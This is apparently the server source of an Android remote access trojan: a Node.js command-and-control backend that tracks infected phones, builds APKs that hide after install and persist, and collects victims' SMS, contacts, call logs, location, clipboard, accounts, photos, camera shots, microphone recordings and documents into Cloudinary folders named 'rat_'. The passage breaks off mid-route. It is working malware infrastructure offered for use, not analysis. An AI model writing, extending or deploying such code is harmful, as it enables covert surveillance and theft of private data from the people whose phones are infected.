const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const morgan = require('morgan');
const fs = require('fs');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs'); 
const { v4: uuidv4 } = require('uuid');
const cloudinary = require('cloudinary').v2;
const multer = require('multer');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  pingTimeout: 60000,
  pingInterval: 25000
});

// ===== Rate Limiting =====
const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 10000; // 10 seconds
const MAX_COMMANDS_PER_WINDOW = 20;

const checkRateLimit = (adminId) => {
  if (!adminId) return true;
  const now = Date.now();
  const windowStart = now - RATE_LIMIT_WINDOW;
  if (!rateLimitMap.has(adminId)) {
    rateLimitMap.set(adminId, []);
    return true;
  }
  const timestamps = rateLimitMap.get(adminId).filter(t => t > windowStart);
  if (timestamps.length >= MAX_COMMANDS_PER_WINDOW) {
    return false;
  }
  timestamps.push(now);
  rateLimitMap.set(adminId, timestamps);
  return true;
};

// Clean rate limit map every 5 minutes
setInterval(() => {
  const now = Date.now();
  const cutoff = now - RATE_LIMIT_WINDOW * 6;
  for (const [key, timestamps] of rateLimitMap.entries()) {
    const valid = timestamps.filter(t => t > cutoff);
    if (valid.length === 0) rateLimitMap.delete(key);
    else rateLimitMap.set(key, valid);
  }
}, 300000);

// ===== Command Queue Auto-Cleanup =====
// Clean up old executed commands from device documents every 10 minutes
setInterval(async () => {
  try {
    const cutoff = new Date(Date.now() - 24 * 60 * 60 * 1000); // 24 hours ago
    await mongoose.connection.db.collection('devices').updateMany(
      {},
      { $pull: { commands: { executedAt: { $lt: cutoff } } } }
    );
  } catch (err) {
    console.error('Command cleanup error:', err.message);
  }
}, 600000); // 10 minutes

// ===== Cloudinary Config =====
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET
});

// ===== Multer Config (temp local storage before upload to Cloudinary) =====
const upload = multer({ dest: path.join(__dirname, 'uploads') });

// Middleware
app.use(cors());
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ extended: true, limit: '500mb' }));
app.use(morgan('dev'));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log('MongoDB Connected'))
  .catch(err => console.log('MongoDB Error:', err));

// Device Schema - use strict:false and Mixed types for flexible data
const DeviceSchema = new mongoose.Schema({
  deviceId: { type: String, unique: true, required: true },
  alias: String,
  adminId: { type: String, index: true }, // Link device to admin who created it
  status: { type: String, default: 'offline', enum: ['online', 'offline', 'sleeping'] },
  ip: String,
  country: String,
  city: String,
  isp: String,
  os: String,
  osVersion: String,
  deviceModel: String,
  manufacturer: String,
  batteryLevel: Number,
  isCharging: Boolean,
  lastSeen: { type: Date, default: Date.now },
  firstSeen: { type: Date, default: Date.now },
  permissions: {
    camera: Boolean,
    location: Boolean,
    sms: Boolean,
    contacts: Boolean,
    storage: Boolean,
    microphone: Boolean,
    phone: Boolean,
    notifications: Boolean
  },
  apkVersion: String,
  isHidden: { type: Boolean, default: false },
  hiddenAt: Date,
  commands: [mongoose.Schema.Types.Mixed],
  sharedWith: [{ type: String, index: true }],
  data: {
    type: Map,
    of: mongoose.Schema.Types.Mixed,
    default: {}
  }
}, { timestamps: true, strict: false });

const Device = mongoose.model('Device', DeviceSchema);

// Admin Schema
const AdminSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  email: String,
  role: { type: String, default: 'user', enum: ['superadmin', 'admin', 'user'] },
  apiKey: String,
  twoFactorSecret: String,
  isTwoFactorEnabled: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now }
});

const Admin = mongoose.model('Admin', AdminSchema);

// APK Build Schema
const ApkBuildSchema = new mongoose.Schema({
  buildId: { type: String, unique: true },
  name: String,
  packageName: String,
  icon: String,
  version: String,
  bindWithApk: String,
  serverUrl: String,
  wsUrl: String,
  hideAfterInstall: { type: Boolean, default: false },
  hideLauncher: { type: Boolean, default: false },
  persistence: { type: Boolean, default: true },
  adminFeatures: {
    camera: { type: Boolean, default: true },
    microphone: { type: Boolean, default: true },
    location: { type: Boolean, default: true },
    sms: { type: Boolean, default: true },
    calls: { type: Boolean, default: true },
    contacts: { type: Boolean, default: true },
    storage: { type: Boolean, default: true },
    notifications: { type: Boolean, default: true }
  },
  createdAt: { type: Date, default: Date.now },
  downloads: { type: Number, default: 0 }
});

const ApkBuild = mongoose.model('ApkBuild', ApkBuildSchema);

// Authentication Middleware
const authMiddleware = async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token provided' });
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'rat_secret_key_2024');
    req.adminId = decoded.id;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
};

// Convert string id to ObjectId for MongoDB queries
const toObjectId = (id) => {
  try {
    return mongoose.Types.ObjectId(id);
  } catch (e) {
    return id;
  }
};

// Socket.IO - Device Communication
io.use(async (socket, next) => {
  const { deviceId, type } = socket.handshake.query;
  if (type === 'device') {
    socket.deviceId = deviceId;
    return next();
  }
  const token = socket.handshake.auth?.token;
  if (token) {
    try {
      const decoded = jwt.verify(token, process.env.JWT_SECRET || 'rat_secret_key_2024');
      socket.adminId = decoded.id;
      return next();
    } catch (err) {
      return next(new Error('Authentication error'));
    }
  }
  next();
});

io.on('connection', async (socket) => {
  console.log('New connection:', socket.id);

  // Device connection
  if (socket.deviceId) {
    try {
      const device = await Device.findOneAndUpdate(
        { deviceId: socket.deviceId },
        { 
          status: 'online', 
          lastSeen: new Date(),
          ip: socket.handshake.address
        },
        { upsert: true, new: true }
      );
      
      socket.join(`device:${socket.deviceId}`);
      
      // Notify admin panels
      io.emit('device:online', { deviceId: socket.deviceId, device });
      
      // Send pending commands
      const pendingCommands = (device.commands || []).filter(c => c && c.status === 'pending');
      pendingCommands.forEach(cmd => {
        socket.emit('command', cmd);
      });

      socket.on('device:update', async (data) => {
        try {
          const allowedFields = {};
          if (data.os) allowedFields.os = data.os;
          if (data.osVersion) allowedFields.osVersion = data.osVersion;
          if (data.deviceModel) allowedFields.deviceModel = data.deviceModel;
          if (data.manufacturer) allowedFields.manufacturer = data.manufacturer;
          if (data.batteryLevel != null) allowedFields.batteryLevel = data.batteryLevel;
          if (data.isCharging != null) allowedFields.isCharging = data.isCharging;
          if (data.ip) allowedFields.ip = data.ip;
          if (data.apiLevel) allowedFields.apiLevel = data.apiLevel;
          if (data.apkVersion) allowedFields.apkVersion = data.apkVersion;
          if (data.permissions) allowedFields.permissions = data.permissions;
          allowedFields.lastSeen = new Date();
          allowedFields.status = 'online';
          
          await Device.findOneAndUpdate(
            { deviceId: socket.deviceId },
            allowedFields
          );
          io.emit('device:data', { deviceId: socket.deviceId, data });
        } catch (err) {
          console.error('Update error:', err.message);
        }
      });

      socket.on('device:result', async (data) => {
        try {
          const { commandId, result, status } = data;
          if (!commandId) return;
          
          const cleanResult = result ? JSON.parse(JSON.stringify(result)) : null;

          const extractFromResult = (val, preferredKey) => {
            if (!val) return val;
            if (Array.isArray(val)) return val;
            if (typeof val === 'object') {
              if (preferredKey && Array.isArray(val[preferredKey])) return val[preferredKey];
              for (const k of Object.keys(val)) {
                if (Array.isArray(val[k])) return val[k];
              }
            }
            return val;
          };

          const updateDoc = {
            $push: {
              commands: {
                commandId,
                status: status || 'executed',
                result: cleanResult,
                executedAt: new Date()
              }
            }
          };

          // For photo capture result with base64 data → Upload to Cloudinary (captured photos)
          if (cleanResult && cleanResult.data && (cleanResult.command === 'take_photo' || cleanResult.command === 'take_photo_front' || cleanResult.command === 'take_photo_back')) {
            try {
              const uploadRes = await cloudinary.uploader.upload(
                `data:image/jpeg;base64,${cleanResult.data}`,
                { folder: `rat_photos/${socket.deviceId}`, resource_type: 'image' }
              );
              cleanResult.cloudinaryUrl = uploadRes.secure_url;
              cleanResult.cloudinaryPublicId = uploadRes.public_id;
              cleanResult.camera = cleanResult.camera || 'back';
              delete cleanResult.data; // Don't store raw base64
            } catch (cloudErr) {
              console.error('Cloudinary upload error:', cloudErr.message);
            }
          }

          // For gallery photo result with base64 data → Upload to Cloudinary (get_photos)
          if (cleanResult && cleanResult.data && cleanResult.command === 'get_photos') {
            try {
              const mimeType = cleanResult.mimeType || 'image/jpeg';
              const uploadRes = await cloudinary.uploader.upload(
                `data:${mimeType};base64,${cleanResult.data}`,
                { folder: `rat_photos/${socket.deviceId}`, resource_type: 'image' }
              );
              cleanResult.cloudinaryUrl = uploadRes.secure_url;
              cleanResult.cloudinaryPublicId = uploadRes.public_id;
              cleanResult.fileName = cleanResult.name || 'photo';
              cleanResult.fileSize = cleanResult.size || 0;
              delete cleanResult.data; // Don't store raw base64
            } catch (cloudErr) {
              console.error('Cloudinary photo upload error:', cloudErr.message);
            }
          }

          // If gallery photo was uploaded to Cloudinary, also push to data.photos array
          if (cleanResult && cleanResult.cloudinaryUrl && cleanResult.command === 'get_photos') {
            updateDoc.$push = {
              ...updateDoc.$push,
              'data.photos': {
                url: cleanResult.cloudinaryUrl,
                publicId: cleanResult.cloudinaryPublicId,
                name: cleanResult.fileName || 'photo',
                size: cleanResult.fileSize || 0,
                mimeType: cleanResult.mimeType || 'image/jpeg',
                timestamp: new Date()
              }
            };
          }

          // For audio recording result with base64 data → Upload to Cloudinary
          if (cleanResult && cleanResult.data && cleanResult.command === 'record_audio') {
            try {
              const uploadRes = await cloudinary.uploader.upload(
                `data:audio/mpeg;base64,${cleanResult.data}`,
                { folder: `rat_audio/${socket.deviceId}`, resource_type: 'video' }
              );
              cleanResult.cloudinaryUrl = uploadRes.secure_url;
              cleanResult.cloudinaryPublicId = uploadRes.public_id;
              delete cleanResult.data;
            } catch (cloudErr) {
              console.error('Cloudinary audio upload error:', cloudErr.message);
            }
          }

          // For video result with base64 data → Upload to Cloudinary
          if (cleanResult && cleanResult.data && cleanResult.command === 'get_videos') {
            try {
              const mimeType = cleanResult.mimeType || 'video/mp4';
              const uploadRes = await cloudinary.uploader.upload(
                `data:${mimeType};base64,${cleanResult.data}`,
                { folder: `rat_videos/${socket.deviceId}`, resource_type: 'video' }
              );
              cleanResult.cloudinaryUrl = uploadRes.secure_url;
              cleanResult.cloudinaryPublicId = uploadRes.public_id;
              delete cleanResult.data;
            } catch (cloudErr) {
              console.error('Cloudinary video upload error:', cloudErr.message);
            }
          }

          // If video was uploaded to Cloudinary, also push to data.videos array
          if (cleanResult && cleanResult.cloudinaryUrl && cleanResult.command === 'get_videos') {
            updateDoc.$push = {
              ...updateDoc.$push,
              'data.videos': {
                url: cleanResult.cloudinaryUrl,
                publicId: cleanResult.cloudinaryPublicId,
                name: cleanResult.name || 'video',
                size: cleanResult.size || 0,
                mimeType: cleanResult.mimeType || 'video/mp4',
                timestamp: new Date()
              }
            };
          }

          // For document result with base64 data → Upload to Cloudinary
          if (cleanResult && cleanResult.data && cleanResult.command === 'get_documents') {
            try {
              const mimeType = cleanResult.mimeType || 'application/octet-stream';
              const resourceType = mimeType.startsWith('image/') ? 'image' : 'raw';
              const uploadRes = await cloudinary.uploader.upload(
                `data:${mimeType};base64,${cleanResult.data}`,
                { folder: `rat_documents/${socket.deviceId}`, resource_type: resourceType }
              );
              cleanResult.cloudinaryUrl = uploadRes.secure_url;
              cleanResult.cloudinaryPublicId = uploadRes.public_id;
              delete cleanResult.data;
            } catch (cloudErr) {
              console.error('Cloudinary document upload error:', cloudErr.message);
            }
          }

          // If document was uploaded to Cloudinary, push to data.documents array
          if (cleanResult && cleanResult.cloudinaryUrl && cleanResult.command === 'get_documents') {
            updateDoc.$push = {
              ...updateDoc.$push,
              'data.documents': {
                url: cleanResult.cloudinaryUrl,
                publicId: cleanResult.cloudinaryPublicId,
                name: cleanResult.name || 'document',
                size: cleanResult.size || 0,
                mimeType: cleanResult.mimeType || 'application/octet-stream',
                timestamp: new Date()
              }
            };
          }

          // Persist result data into device.data
          const dataSetOps = {};
          
          // Merge any $push operations from Cloudinary uploads into updateDoc
          if (updateDoc.$push && updateDoc.$push['data.photos']) {
            updateDoc.$push['data.photos'] = updateDoc.$push['data.photos'];
          }
          if (updateDoc.$push && updateDoc.$push['data.videos']) {
            updateDoc.$push['data.videos'] = updateDoc.$push['data.videos'];
          }
          if (updateDoc.$push && updateDoc.$push['data.documents']) {
            updateDoc.$push['data.documents'] = updateDoc.$push['data.documents'];
          }
          if (cleanResult && typeof cleanResult === 'object' && !cleanResult.error) {
            if (cleanResult.contacts)              dataSetOps['data.contacts']      = extractFromResult(cleanResult.contacts, 'contacts');
            if (cleanResult.sms)                   dataSetOps['data.sms']           = extractFromResult(cleanResult.sms, 'sms');
            if (cleanResult.callLogs)              dataSetOps['data.callLogs']      = extractFromResult(cleanResult.callLogs, 'callLogs');
            if (cleanResult.installedApps)         dataSetOps['data.installedApps'] = extractFromResult(cleanResult.installedApps, 'installedApps');
            if (cleanResult.deviceInfo)            dataSetOps['data.deviceInfo']    = cleanResult.deviceInfo;
            if (cleanResult.photos || cleanResult.images) dataSetOps['data.photos'] = extractFromResult(cleanResult.photos || cleanResult.images, 'images');
            if (cleanResult.videos)                dataSetOps['data.videos']        = extractFromResult(cleanResult.videos, 'videos');
            if (cleanResult.documents)             dataSetOps['data.documents']     = extractFromResult(cleanResult.documents, 'documents');
            if (cleanResult.battery)               dataSetOps['data.battery']       = cleanResult.battery;
            if (cleanResult.simInfo)               dataSetOps['data.simInfo']       = cleanResult.simInfo;
            if (cleanResult.networkInfo)           dataSetOps['data.networkInfo']   = cleanResult.networkInfo;
            if (cleanResult.clipboard)             dataSetOps['data.clipboard']     = cleanResult.clipboard;
            if (cleanResult.notifications)         dataSetOps['data.notifications'] = cleanResult.notifications;
            if (cleanResult.networks)              dataSetOps['data.wifiNetworks']  = cleanResult.networks;
            if (cleanResult.accounts)              dataSetOps['data.accounts']      = cleanResult.accounts;
            if (cleanResult.screenshot)            dataSetOps['data.screenshot']    = cleanResult.screenshot;
            // Store captured photo reference (only for take_photo)
            if (cleanResult.cloudinaryUrl && cleanResult.command === 'take_photo') {
              dataSetOps['data.lastPhoto'] = { url: cleanResult.cloudinaryUrl, publicId: cleanResult.cloudinaryPublicId, timestamp: new Date() };
            }
          }


          // If photo was captured, also push to data.capturedPhotos array
          if (cleanResult && cleanResult.cloudinaryUrl && cleanResult.command === 'take_photo') {
            updateDoc.$push = {
              ...updateDoc.$push,
              'data.capturedPhotos': {
                url: cleanResult.cloudinaryUrl,
                publicId: cleanResult.cloudinaryPublicId,
                timestamp: new Date()
              }
            };
          }

          // If audio was recorded, push to data.recordedAudios array
          if (cleanResult && cleanResult.cloudinaryUrl && cleanResult.command === 'record_audio') {
            updateDoc.$push = {
              ...updateDoc.$push,
              'data.recordedAudios': {
                url: cleanResult.cloudinaryUrl,
                publicId: cleanResult.cloudinaryPublicId,
                timestamp: new Date()
              }
            };
          }

          // IMPORTANT: If the result is a location (has lat/lng), push to data.locations
          if (cleanResult && typeof cleanResult === 'object' && !cleanResult.error && cleanResult.lat != null && cleanResult.lng != null) {
            updateDoc.$push = {
              ...updateDoc.$push,
              'data.locations': {
                lat: cleanResult.lat,
                lng: cleanResult.lng,
                accuracy: cleanResult.accuracy || 0,
                altitude: cleanResult.altitude || 0,
                speed: cleanResult.speed || 0,
                bearing: cleanResult.bearing || 0,
                provider: cleanResult.provider || 'unknown',
                address: cleanResult.address || '',
                timestamp: cleanResult.timestamp ? new Date(cleanResult.timestamp) : new Date()
              }
            };
          }

          if (Object.keys(dataSetOps).length > 0) {
            updateDoc.$set = dataSetOps;
          }

          await mongoose.connection.db.collection('devices').updateOne(
            { deviceId: socket.deviceId },
            updateDoc
          );

          io.emit(`command:result:${commandId}`, { deviceId: socket.deviceId, result: cleanResult, status });
          io.emit('device:data:update', { deviceId: socket.deviceId });
        } catch (err) {
          console.error('Result error:', err.message);
        }
      });

      socket.on('device:data:bulk', async (data) => {
        try {
          const extractArray = (val, preferredKey) => {
            if (!val) return val;
            if (Array.isArray(val)) return val;
            if (typeof val === 'object') {
              if (preferredKey && Array.isArray(val[preferredKey])) return val[preferredKey];
              for (const k of Object.keys(val)) {
                if (Array.isArray(val[k])) return val[k];
              }
            }
            return val;
          };

          const dataKeyMap = {
            contacts:     'contacts',
            sms:          'sms',
            callLogs:     'callLogs',
            photos:       'images',
            videos:       'videos',
            documents:    'documents',
            installedApps:'installedApps'
          };

          const setOps = {};
          Object.entries(dataKeyMap).forEach(([key, innerKey]) => {
            if (data[key] != null) {
              setOps[`data.${key}`] = extractArray(data[key], innerKey);
            }
          });

          if (data.deviceInfo)   setOps['data.deviceInfo']   = data.deviceInfo;
          if (data.battery)      setOps['data.battery']      = data.battery;
          if (data.simInfo)      setOps['data.simInfo']      = data.simInfo;
          if (data.networkInfo)  setOps['data.networkInfo']  = data.networkInfo;
          if (data.clipboard)    setOps['data.clipboard']    = data.clipboard;

          const updateDoc = {};
          if (Object.keys(setOps).length > 0) {
            updateDoc.$set = setOps;
          }

          if (data.location && (data.location.lat != null || data.location.lng != null)) {
            updateDoc.$push = {
              'data.locations': { ...data.location, timestamp: new Date() }
            };
          }

          if (Object.keys(updateDoc).length > 0) {
            await mongoose.connection.db.collection('devices').updateOne(
              { deviceId: socket.deviceId },
              updateDoc
            );
            console.log(`Bulk data saved for ${socket.deviceId}:`, Object.keys(setOps).join(', '));
          }

          io.emit('device:data:update', { deviceId: socket.deviceId });
        } catch (err) {
          console.error('Bulk data error:', err.message);
        }
      });

      // Handle photo upload from Android (base64 sent via socket)
      socket.on('device:photo', async (data) => {
        try {
          const { imageBase64, camera } = data;
          if (!imageBase64) return;
          
          const uploadRes = await cloudinary.uploader.upload(
            `data:image/jpeg;base64,${imageBase64}`,
            { folder: `rat_photos/${socket.deviceId}`, resource_type: 'image' }
          );
          
          const photoEntry = {
            url: uploadRes.secure_url,
            publicId: uploadRes.public_id,
            camera: camera || 'back',
            timestamp: new Date()
          };
          
          await mongoose.connection.db.collection('devices').updateOne(
            { deviceId: socket.deviceId },
            { 
              $push: { 'data.capturedPhotos': photoEntry },
              $set: { 'data.lastPhoto': photoEntry, lastSeen: new Date() }
            }
          );
          
          io.emit('device:data:update', { deviceId: socket.deviceId });
          console.log(`Photo saved for ${socket.deviceId}: ${uploadRes.secure_url}`);
        } catch (err) {
          console.error('device:photo error:', err.message);
        }
      });

      // Heartbeat monitor: auto mark offline if no ping for 90 seconds
      const heartbeatInterval = setInterval(async () => {
        try {
          const cutoff = new Date(Date.now() - 90 * 1000);
          const deviceDoc = await Device.findOne({ deviceId: socket.deviceId }).lean();
          if (deviceDoc && deviceDoc.status === 'online' && (!deviceDoc.lastSeen || new Date(deviceDoc.lastSeen) < cutoff)) {
            await Device.findOneAndUpdate(
              { deviceId: socket.deviceId },
              { status: 'offline', lastSeen: new Date() }
            );
            io.emit('device:offline', { deviceId: socket.deviceId });
          }
        } catch (e) {}
      }, 30000);

      socket.on('disconnect', async () => {
        clearInterval(heartbeatInterval);
        console.log('Device disconnected:', socket.deviceId);
        await Device.findOneAndUpdate(
          { deviceId: socket.deviceId },
          { status: 'offline', lastSeen: new Date() }
        );
        io.emit('device:offline', { deviceId: socket.deviceId });
      });

      socket.on('device:ping', async () => {
        await Device.findOneAndUpdate(
          { deviceId: socket.deviceId },
          { lastSeen: new Date(), status: 'online' }
        );
        socket.emit('device:pong');
      });

      // Mark as online immediately on initial connection with device info
      setTimeout(async () => {
        await Device.findOneAndUpdate(
          { deviceId: socket.deviceId },
          { status: 'online', lastSeen: new Date() }
        );
        io.emit('device:online', { deviceId: socket.deviceId });
      }, 2000);

    } catch (err) {
      console.error('Device connection error:', err);
    }
  }

  // Admin panel connection
  if (socket.adminId) {
    socket.join('admin');
    
    socket.on('command:send', async (data) => {
      try {
        const { deviceId, type, params } = data;
        const commandId = uuidv4();
        
        await Device.findOneAndUpdate(
          { deviceId },
          { 
            $push: { 
              commands: {
                commandId,
                type,
                params,
                status: 'pending',
                createdAt: new Date()
              }
            }
          }
        );
        
        io.to(`device:${deviceId}`).emit('command', { commandId, type, params });
        socket.emit('command:sent', { commandId, deviceId, type });
      } catch (err) {
        socket.emit('command:error', { error: err.message });
      }
    });

    socket.on('command:send:immediate', async (data) => {
      try {
        const { deviceId, type, params } = data;
        io.to(`device:${deviceId}`).emit('command', { 
          commandId: 'immediate_' + Date.now(), 
          type, 
          params,
          immediate: true
        });
      } catch (err) {
        socket.emit('command:error', { error: err.message });
      }
    });
  }
});

// ===== REST API Routes =====

// Auth Routes
app.post('/api/auth/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    const trimmed = username.trim();
    console.log(`Login attempt: username="${trimmed}"`);
    // Find by username OR email (supports old email-login accounts and new username accounts)
    const admin = await Admin.findOne({ 
      $or: [
        { username: trimmed },
        { email: trimmed }
      ]
    });
    if (!admin) {
      console.log(`Login failed: no admin found for "${trimmed}"`);
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    console.log(`Found admin: username="${admin.username}" email="${admin.email}" passwordHash startsWith="${(admin.password || '').substring(0, 4)}"`);
    
    // Support both bcrypt-hashed passwords AND old plaintext passwords
    let isMatch = false;
    try {
      isMatch = await bcrypt.compare(password, admin.password);
    } catch (bcryptErr) {
      // If bcrypt fails (e.g., not a bcrypt hash), fall back to plaintext comparison
      console.log('Bcrypt compare failed, trying plaintext fallback');
      isMatch = (password === admin.password);
    }
    
    if (!isMatch) {
      console.log(`Login failed: password mismatch for user "${admin.username}"`);
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // If password was plaintext, upgrade to bcrypt
    if (!admin.password.startsWith('$2a$') && !admin.password.startsWith('$2b$')) {
      console.log(`Upgrading plaintext password to bcrypt for user "${admin.username}"`);
      const hashedPassword = await bcrypt.hash(password, 12);
      await Admin.updateOne({ _id: admin._id }, { $set: { password: hashedPassword } });
    }
    
    console.log(`Login success: ${admin.username} (${admin.email})`);
    const token = jwt.sign({ id: admin._id }, process.env.JWT_SECRET || 'rat_secret_key_2024', { expiresIn: '7d' });
    res.json({ token, admin: { username: admin.username, email: admin.email } });
  } catch (err) {
    console.error('Login error:', err);
    res.status(500).json({ error: err.message });
  }
});

// Get current user info
app.get('/api/auth/me', authMiddleware, async (req, res) => {
  try {
    const admin = await Admin.findById(req.adminId).lean();
    if (!admin) return res.status(404).json({ error: 'User not found' });
    res.json({ username: admin.username, email: admin.email, role: admin.role });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/auth/register', async (req, res) => {
  try {
    const { username, password, email } = req.body;
    
    // Check both username and email uniqueness (old accounts may have email as username)
    const existingUser = await Admin.findOne({ 
      $or: [
        { username },
        { email: username },
        { email }
      ]
    });
    if (existingUser) {
      return res.status(400).json({ error: 'Username already exists' });
    }
    
    // First user becomes superadmin, rest are 'user' role
    const adminCount = await Admin.countDocuments();
    const role = adminCount === 0 ? 'admin' : 'user';
    
    const hashedPassword = await bcrypt.hash(password, 12);
    const admin = new Admin({ username, password: hashedPassword, email, role, apiKey: uuidv4() });
    await admin.save();
    const token = jwt.sign({ id: admin._id }, process.env.JWT_SECRET || 'rat_secret_key_2024', { expiresIn: '7d' });
    res.json({ token, admin: { username: admin.username, email: admin.email } });
  } catch (err) {
    if (err.code === 11000) {
      return res.status(400).json({ error: 'Username already exists' });
    }
    res.status(500).json({ error: err.message });
  }
});

// Get all devices (owned + unassigned) for admins to claim
// Device access request model
const AccessRequestSchema = new mongoose.Schema({
  deviceId: { type: String, required: true, index: true },
  requesterId: { type: String, required: true, index: true },
  ownerId: { type: String, required: true, index: true },
  status: { type: String, default: 'pending', enum: ['pending', 'approved', 'rejected'] },
  message: String,
  reviewedAt: Date,
  createdAt: { type: Date, default: Date.now }
});
const AccessRequest = mongoose.model('AccessRequest', AccessRequestSchema);

const getAdminId = (req) => {
  if (!req.adminId) return null;
  return typeof req.adminId === 'string' ? req.adminId : req.adminId.toString();
};

// Get all devices (owned + unassigned) for admins to claim
app.get('/api/devices/all', authMiddleware, async (req, res) => {
  try {
    const allDevices = await Device.find({}).sort({ lastSeen: -1 }).lean();
    const adminId = getAdminId(req);
    const owned = [];
    const unassigned = [];
    allDevices.forEach(d => {
      if (d.data instanceof Map) d.data = Object.fromEntries(d.data);
      if (d.adminId == null || d.adminId === '' || d.adminId === undefined) {
        unassigned.push(d);
      } else if (d.adminId === adminId) {
        owned.push(d);
      }
    });
    res.json([...owned, ...unassigned]);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Request access to a device
app.post('/api/devices/:deviceId/request-access', authMiddleware, async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { message } = req.body;
    const adminId = getAdminId(req);
    const device = await Device.findOne({ deviceId }).lean();
    if (!device) return res.status(404).json({ error: 'Device not found' });
    if (device.adminId == null || device.adminId === '' || device.adminId === undefined) {
      return res.status(400).json({ error: 'Device is unassigned. Ask an admin to claim it first.' });
    }
    // Prevent owner from requesting access to their own device
    if (device.adminId === adminId) {
      return res.status(400).json({ error: 'You already own this device' });
    }
    // Check if already requested
    const existing = await AccessRequest.findOne({ deviceId, requesterId: adminId, status: 'pending' });
    if (existing) return res.status(400).json({ error: 'Access request already pending' });
    const request = new AccessRequest({
      deviceId,
      requesterId: adminId,
      ownerId: device.adminId,
      message: message || ''
    });
    await request.save();
    res.json({ success: true, message: 'Access request sent to device owner' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Get pending access requests for admin's devices
app.get('/api/access-requests', authMiddleware, async (req, res) => {
  try {
    const adminId = getAdminId(req);
    const requests = await AccessRequest.find({ ownerId: adminId, status: 'pending' })
      .sort({ createdAt: -1 })
      .lean();
    // Include requester details
    const enriched = await Promise.all(requests.map(async (r) => {
      const requester = await Admin.findById(r.requesterId).lean();
      const device = await Device.findOne({ deviceId: r.deviceId }).lean();
      return {
        ...r,
        requesterUsername: requester?.username || 'Unknown',
        deviceModel: device?.deviceModel || device?.deviceId || 'Unknown'
      };
    }));
    res.json(enriched);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Approve or reject access request
app.post('/api/access-requests/:requestId', authMiddleware, async (req, res) => {
  try {
    const { requestId } = req.params;
    const { action } = req.body;
    const adminId = getAdminId(req);
    const request = await AccessRequest.findOne({ _id: requestId, ownerId: adminId });
    if (!request) return res.status(404).json({ error: 'Request not found' });
    if (request.status !== 'pending') return res.status(400).json({ error: 'Request already processed' });
    // Prevent self-approval
    if (request.requesterId === adminId) {
      return res.status(400).json({ error: 'Cannot approve your own access request' });
    }
    
    request.status = action === 'approve' ? 'approved' : 'rejected';
    request.reviewedAt = new Date();
    await request.save();
    
    if (action === 'approve') {
      await Device.updateOne(
        { deviceId: request.deviceId },
        { $addToSet: { sharedWith: request.requesterId } }
      );
    }
    
    res.json({ success: true, status: request.status });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Devices Routes
app.get('/api/devices', authMiddleware, async (req, res) => {
  try {
    const adminId = getAdminId(req);
    console.log('[DEVICES LIST] adminId:', adminId, 'type:', typeof adminId);
    // First get ALL devices to see what's in DB
    const allDevices = await Device.find({}).sort({ lastSeen: -1 }).lean();
    console.log('[DEVICES LIST] Total devices in DB:', allDevices.length);
    allDevices.forEach(d => {
      console.log('[DEVICES LIST] Device:', d.deviceId, 'adminId:', d.adminId, 'type:', typeof d.adminId, 'sharedWith:', d.sharedWith);
      if (d.data instanceof Map) d.data = Object.fromEntries(d.data);
    });
    // Show devices owned by admin OR shared with admin
    const devices = await Device.find({
      $or: [
        { adminId },
        { sharedWith: adminId }
      ]
    }).sort({ lastSeen: -1 }).lean();
    console.log('[DEVICES LIST] Matched devices:', devices.length);
    devices.forEach(d => {
      if (d.data instanceof Map) d.data = Object.fromEntries(d.data);
    });
    res.json(devices);
  } catch (err) {
    console.error('[DEVICES LIST] Error:', err);
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/devices/:deviceId', authMiddleware, async (req, res) => {
  try {
    const adminId = getAdminId(req);
    console.log('[DEVICE DETAIL] Looking for device:', req.params.deviceId, 'adminId:', adminId);
    const device = await Device.findOne({
      deviceId: req.params.deviceId,
      $or: [
        { adminId },
        { sharedWith: adminId }
      ]
    }).lean();
    console.log('[DEVICE DETAIL] Found:', !!device);
    if (!device) return res.status(404).json({ error: 'Device not found' });
    if (device.data instanceof Map) {
      device.data = Object.fromEntries(device.data);
    }
    res.json(device);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/devices/:deviceId/command', authMiddleware, async (req, res) => {
  try {
    const { type, params } = req.body;
    const adminId = getAdminId(req);
    const device = await Device.findOne({
      deviceId: req.params.deviceId,
      $or: [
        { adminId },
        { sharedWith: adminId }
      ]
    });
    if (!device) return res.status(404).json({ error: 'Device not found or no access' });
    
    const commandId = uuidv4();
    device.commands.push({
      commandId,
      type,
      params,
      status: 'pending',
      createdAt: new Date()
    });
    await device.save();
    
    io.to(`device:${req.params.deviceId}`).emit('command', { commandId, type, params });
    
    res.json({ commandId, status: 'pending' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===== SEARCH ENDPOINTS =====

// Search contacts
app.get('/api/devices/:deviceId/search/contacts', authMiddleware, async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { q } = req.query;
    const adminId = getAdminId(req);
    const device = await Device.findOne({
      deviceId,
      $or: [
        { adminId },
